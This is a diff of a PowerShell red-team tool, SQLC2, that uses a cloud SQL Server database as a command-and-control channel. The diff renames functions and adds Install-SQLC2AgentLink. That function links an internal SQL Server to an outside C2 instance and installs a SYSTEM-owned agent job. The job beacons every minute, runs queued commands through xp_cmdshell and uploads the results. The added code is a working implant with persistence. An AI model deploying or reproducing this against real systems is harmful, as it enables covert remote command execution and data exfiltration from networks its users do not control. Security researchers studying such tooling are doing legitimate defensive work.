@@ -28,7 +28,7 @@
 	    Install C2 tables in remote SQL Server instance. You will need to provide an database that you have the ability to create tables in, or create a new at database.  However, in Azure I've been getting some timeouts which is why you should have already created the target database through Azure.  
 
 	    Example command:
-	    Install-SQLC2 -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
+	    Install-SQLC2Server -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
 
 	    2. Setup OS command.
 
@@ -48,12 +48,16 @@
 
 	     Get-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
 
-	    3. Execute queued commands.
+	    5. Execute queued commands via PS. This can be scheduled via a WMI subscription or schedule task.
 
 	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. Including the -Execute flag will automatically run them.  This command could be used in combination with your prefered persistence method such as a scheduled task.
 
 	    Example command:
 	    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Execute
+		
+	    5. Execute queued commands via SQL Server link and agent job. This allows you to use an internal SQL Server as your agent.	This requires sysadmin privileges on the internal SQL Server.	
+	    
+	    Install-SQLC2AgentLink -Instance 'InternalSQLServer1\SQLSERVER2014' -C2Username 'CloudAdmin' -C2Password 'CloudPassword!' -C2Instance sqlcloudc2.database.windows.net -C2Database database1 -Verbose 	
 
 	    6. View command results.
 
@@ -626,7 +630,7 @@ Function Get-ComputerNameFromInstance
 
 
 # ----------------------------------
-#  Install-SQLC2
+#  Install-SQLC2Server
 # ----------------------------------
 # Author: Scott Sutherland
 Function Install-SQLC2Server
@@ -648,8 +652,8 @@ Function Install-SQLC2Server
             .PARAMETER DatabaseName
             Database name that contains target table.
             .EXAMPLE
-            PS C:\> Install-SQLC2 -Instance "SQLServer1\STANDARDDEV2014" -Database database1 
-            PS C:\> Install-SQLC2 -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1 
+            PS C:\> Install-SQLC2Server -Instance "SQLServer1\STANDARDDEV2014" -Database database1 
+            PS C:\> Install-SQLC2Server -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1 
     #>
     [CmdletBinding()]
     Param(
@@ -797,6 +801,337 @@ Function Install-SQLC2Server
     }
 }
 
+# ----------------------------------
+#  Install-SQLC2AgentLink - In Progress
+# ----------------------------------
+# Author: Scott Sutherland
+Function Install-SQLC2AgentLink
+{
+    <#
+            .SYNOPSIS
+            This functions installs a C2 Agent on the target SQL Server by creating a server link
+            to the C2 SQL Server, then it creates a TSQL SQL Agent job that uses the link to download
+            commands from the C2 server and executes them. By default is execute OS command using xp_cmdshell.
+            This requires sysadmin privileges on the target server.           
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER C2Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER C2Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER C2Instance
+            SQL Server C2 instance to connection to.
+            .PARAMETER C2DatabaseName
+            Database name that contains target table on C2.
+            .EXAMPLE
+            Connecting using current Windows credentials.
+            PS C:\> Install-SQLC2AgentLink -Instance "SQLServer1\STANDARDDEV2014" -C2Instance cloudserver1.database.windows.net -C2Username user -C2Password password -C2Database database1 
+            .EXAMPLE
+            Connecting using sa SQL server login.
+            PS C:\> Install-SQLC2AgentLink -Instance "SQLServer1\STANDARDDEV2014" -Username sa -Pasword password! -C2Instance cloudserver1.database.windows.net -C2Username user -C2Password password -C2Database database1 
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'C2 SQL Server instance to connection to.')]
+        [string]$C2Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server login or domain account to the authenticate to the C2 SQL Server with.')]
+        [string]$C2Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server login domain account password to authenticate to the C2 SQL Server with.')]
+        [string]$C2Password,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Database containing target C2 table on C2 SQL Server.')]
+        [string]$C2Database,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Create data tables for output
+        $TblResults = New-Object -TypeName System.Data.DataTable
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+
+        # Test connection
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }        
+
+        # ----------------------------
+        # Create SQL Server link
+        # ----------------------------        
+
+        # Generate random name for server link - needs to be random
+        $RandomLink = "SQLC2Server"        
+
+         # Create SQL Server link query 
+        $Query = "    
+                    -- Create Server Link C2 Server 
+                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 0
+                    EXEC master.dbo.sp_addlinkedserver @server = N'$RandomLink', 
+                    @srvproduct=N'', 
+                    @provider=N'SQLNCLI', 
+                    @datasrc=N'$C2Instance', 
+                    @catalog=N'$C2Database'                    
+
+                    -- Associate credentials with the server link
+                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
+                    EXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname=N'$RandomLink',
+                    @useself=N'False',
+                    @locallogin=NULL,
+                    @rmtuser=N'$C2Username',
+                    @rmtpassword='$C2Password'        
+
+                    -- Configure the server link
+                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
+                    EXEC master.dbo.sp_serveroption @server=N'$RandomLink', @optname=N'data access', @optvalue=N'true'                    
+
+                    --IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
+                    EXEC master.dbo.sp_serveroption @server=N'$RandomLink', @optname=N'rpc', @optvalue=N'true'
+
+                    --IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
+                    EXEC master.dbo.sp_serveroption @server=N'$RandomLink', @optname=N'rpc out', @optvalue=N'true'
+                    
+                    -- Verify addition of link
+                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1 
+                        SELECT 1
+                    ELSE
+                        SELECT 0  
+           "
+        
+        # Run Query
+        Write-Verbose "$instance : Creating server link named '$RandomLink' as $C2Username to $C2Instance "
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -TimeOut 300 
+
+        # Verify link addition
+        if(($TblResults | Select Column1 -ExpandProperty Column1) -eq 1)
+        {
+            Write-Verbose "$instance : Confirmed server link named $RandomLink was added."
+        }else{
+            Write-Verbose "$instance : The server link could not be created."
+            return
+        }
+        
+        # -------------------------------
+        # Create SQL Server Agent Job
+        # -------------------------------
+
+        # Generate random name for the SQL Agent Job
+        Write-Verbose "$instance : Creating SQL Agent Job on $Instance."  
+        Write-Verbose "$instance : The agent will beacon to $C2Instance every minute."  
+
+        # Create SQL Server agent job
+        $Query = " 
+
+            /****** Object:  Job [SQLC2 Agent Job]    Script Date: 5/21/2018 12:23:40 PM ******/
+            BEGIN TRANSACTION
+            DECLARE @ReturnCode INT
+            SELECT @ReturnCode = 0
+            /****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 5/21/2018 12:23:40 PM ******/
+            IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
+            BEGIN
+            EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
+            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
+
+            END
+
+            DECLARE @jobId BINARY(16)
+            EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'SQLC2 Agent Job', 
+		            @enabled=1, 
+		            @notify_level_eventlog=0, 
+		            @notify_level_email=0, 
+		            @notify_level_netsend=0, 
+		            @notify_level_page=0, 
+		            @delete_level=0, 
+		            @description=N'No description available.', 
+		            @category_name=N'[Uncategorized (Local)]', 
+		            @owner_login_name=N'NT AUTHORITY\SYSTEM', @job_id = @jobId OUTPUT
+            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
+            /****** Object:  Step [Run command]    Script Date: 5/21/2018 12:23:40 PM ******/
+            EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'Run command', 
+		            @step_id=1, 
+		            @cmdexec_success_code=0, 
+		            @on_success_action=1, 
+		            @on_success_step_id=0, 
+		            @on_fail_action=2, 
+		            @on_fail_step_id=0, 
+		            @retry_attempts=0, 
+		            @retry_interval=0, 
+		            @os_run_priority=0, @subsystem=N'TSQL', 
+		            @command=N'
+
+                    -- Query server link - Register the agent
+                    IF not Exists (SELECT * FROM [$RandomLink].database1.dbo.C2Agents  WHERE servername = (select @@SERVERNAME))
+	                    INSERT [$RandomLink].database1.dbo.C2Agents (servername,agentype) VALUES ((select @@SERVERNAME),''ServerLink'')
+                     ELSE
+	                    UPDATE [$RandomLink].database1.dbo.C2Agents SET lastcheckin = (select GETDATE ())
+                        WHERE servername like (select @@SERVERNAME)
+
+                    -- Get the pending commands for this server from the C2 SQL Server
+                    DECLARE @output TABLE (cid int,servername varchar(8000),command varchar(8000))
+                    INSERT @output (cid,servername,command) SELECT cid,servername,command FROM [$RandomLink].database1.dbo.C2Commands WHERE status like ''pending'' and servername like @@servername
+
+                    -- Run all the command for this server
+                    WHILE (SELECT count(*) FROM @output) > 0 
+                    BEGIN
+	
+	                    -- Setup variables
+	                    DECLARE @CurrentCid varchar (8000) -- current cid
+	                    DECLARE @CurrentCmd varchar (8000) -- current command
+	                    DECLARE @xpoutput TABLE ([rid] int IDENTITY(1,1) PRIMARY KEY,result varchar(max)) -- xp_cmdshell output table
+	                    DECLARE @result varchar(8000) -- xp_cmdshell output value
+
+	                    -- Get first command in the list - need to add cid
+	                    SELECT @CurrentCid = (SELECT TOP 1 cid FROM @output)
+	                    SELECT @CurrentCid as cid
+	                    SELECT @CurrentCmd = (SELECT TOP 1 command FROM @output)
+	                    SELECT @CurrentCmd as command
+		
+	                    -- Run the command - not command output break when multiline - need fix, and add cid
+	                    INSERT @xpoutput (result) exec master..xp_cmdshell @CurrentCmd
+	                    SET @result = (select top 1 result from  @xpoutput)
+	                    select @result as result
+
+	                    -- Upload results to C2 SQL Server - need to add cid
+	                    Update [$RandomLink].database1.dbo.C2Commands set result = @result, status=''success''
+	                    WHERE servername like @@SERVERNAME and cid like @CurrentCid
+
+	                    -- Clear the command result history
+	                    DELETE FROM @xpoutput 
+
+	                    -- Remove first command
+	                    DELETE TOP (1) FROM @output 
+                    END', 
+		            @database_name=N'master', 
+		            @flags=0
+            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
+            EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
+            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
+            EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'SQLC2 Agent Schedule', 
+		            @enabled=1, 
+		            @freq_type=4, 
+		            @freq_interval=1, 
+		            @freq_subday_type=4, 
+		            @freq_subday_interval=1, 
+		            @freq_relative_interval=0, 
+		            @freq_recurrence_factor=0, 
+		            @active_start_date=20180521, 
+		            @active_end_date=99991231, 
+		            @active_start_time=0, 
+		            @active_end_time=235959, 
+		            @schedule_uid=N'9eb66fdb-70d6-4ccf-8b60-a97431487e88'
+            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
+            EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
+            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
+            COMMIT TRANSACTION
+            GOTO EndSave
+            QuitWithRollback:
+                IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
+            EndSave:
+            
+            -- Script: Get-AgentJob.sql
+            -- Description: Return a list of agent jobs.
+            -- Reference: https://msdn.microsoft.com/en-us/library/ms189817.aspx
+
+            SELECT 	SUSER_SNAME(owner_sid) as [JOB_OWNER], 
+	            job.job_id as [JOB_ID],
+	            name as [JOB_NAME],
+	            description as [JOB_DESCRIPTION],
+	            step_name,
+	            command,
+	            enabled,
+	            server,
+	            database_name,
+	            date_created
+            FROM [msdb].[dbo].[sysjobs] job
+            INNER JOIN [msdb].[dbo].[sysjobsteps] steps        
+	            ON job.job_id = steps.job_id
+            WHERE name like 'SQLC2 Agent Job'
+            ORDER BY JOB_OWNER,JOB_NAME"
+        
+        # Run Query
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'msdb' -SuppressVerbose -TimeOut 300
+
+        # Verify job was added
+        if(($TblResults | Measure-Object | select count -ExpandProperty count) -eq 1)
+        {
+            Write-Verbose "$instance : Confirmed the job named 'SQLC2 Agent Job' was added."
+        }else{
+            Write-Verbose "$instance : The agent job could not be created or already exists."
+            Write-Verbose "$instance : You will have to remove the SQL Server link 'SQLC2Server."
+            return
+        }      
+
+        Write-Verbose "$instance : Done."
+    }
+
+    End
+    {
+        # Return data
+        # $TblResults
+    }
+}
+
 
 # ----------------------------------
 #  Register-SQLC2Agent
@@ -815,8 +1150,6 @@ Function Register-SQLC2Agent
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name that contains target table.
             .PARAMETER Table
@@ -939,8 +1272,6 @@ Function Get-SQLC2Agent
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name that contains target table.
             .PARAMETER Table
@@ -1055,8 +1386,6 @@ Function Set-SQLC2Command
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name that contains target table.
             .PARAMETER ServerName
@@ -1196,8 +1525,6 @@ Function Get-SQLC2Command
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name that contains target table.      
             .PARAMETER Execute
@@ -1341,8 +1668,6 @@ Function Create-SQLC2Command
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name that contains target table.
             .PARAMETER Command
@@ -1488,8 +1813,6 @@ Function Get-SQLC2Result
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name that contains target table.    
             .PARAMETER ServerName
@@ -1783,8 +2106,6 @@ Function Remove-SQLC2Agent
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name that contains target table.     
             .PARAMETER ServerName
